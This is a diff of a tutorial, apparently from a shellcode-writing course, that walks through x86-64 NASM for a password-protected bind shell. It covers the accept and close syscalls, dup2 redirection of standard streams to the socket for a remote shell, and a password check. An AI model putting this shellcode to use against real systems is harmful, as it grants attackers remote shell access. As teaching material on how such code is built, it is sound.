@@ -186,7 +186,7 @@ sub rsp, 8 ;adjust the stack pointer by 8 bytes for the above 3 commands so that
 bind(sock, (struct sockaddr *)&server, sockaddr_len);
 ```
 
-Ok, now that RSP is pointing to your constructed Data Structure, let's write the syscall instructions.
+Ok, now that RSP is pointing to our constructed Data Structure, let's write the syscall instructions.
 
 ```nasm
 mov rax, 49 ;syscall number for bind
@@ -217,17 +217,68 @@ new_sock = accept(sock, (struct sockaddr *)&client, &sockaddr_len);
 close(sock);
 ```
 
-```nasm
-mov rax, 43
-sub rsp, 16
-mov rsi, rsp
-mov byte [rsp-1], 16
-sub rsp, 1
-mov rdx, rsp
-syscall
-        
-mov r9, rax
+For the client sockaddr Data Strucute we only need to reserve space on the stack to hold the client data as accept will populate the information for us. After we have our "new_sock", return value of the accept syscall stored in rax, we need to also close the original socket.
 
-mov rax, 3
+```nasm
+mov rax, 43 ;syscall number for accept
+sub rsp, 16 ;move the stack pointer 16 bytes for client Data Structure
+mov rsi, rsp ;move the stack pointer to rsi as third argument 
+mov byte [rsp-1], 16 ;move the value 16 onto the stack for sockaddr_len
+sub rsp, 1 ;adjust the stack pointer to point to the value 16
+mov rdx, rsp ;store rsp in rdx as third argument
+syscall ;syscall accept instruction
+        
+mov r9, rax ;store "new_sock" in a safe place to use later
+
+mov rax, 3 ;syscall number for close
+syscall ;syscall close instruction
+```
+
+<h3>Stage 5 - Map STDIN/STDOUT and STDERROR to the new socket for remote shell capabilities</h3>
+
+```c
+dup2(new_sock, 0);
+dup2(new_sock, 1);
+dup2(new_sock, 2);
+```
+
+```nasm
+mov rax, 33
+mov rdi, r9
+mov rsi, 0
 syscall
+
+mov rax, 33
+mov rsi, 1
+syscall
+
+mov rax, 33
+mov rsi, 2
+syscall
+```
+
+<h3>Stage 6 - Wait for input (password) to be received and compare it against the correct password string</h3>
+
+```c
+read(new_sock, buf, 16);
+buf[strcspn(buf, "\n")] = 0;
+if (strcmp(arguments[3], buf) == 0)
+{
+}
+```
+
+```nasm
+xor rax, rax
+
+push r10
+push r11
+mov rsi, rsp
+
+mov rdx, 16
+syscall
+
+mov rax, [rel pass]
+mov rdi, rsi
+scasq
+jne exit
 ```
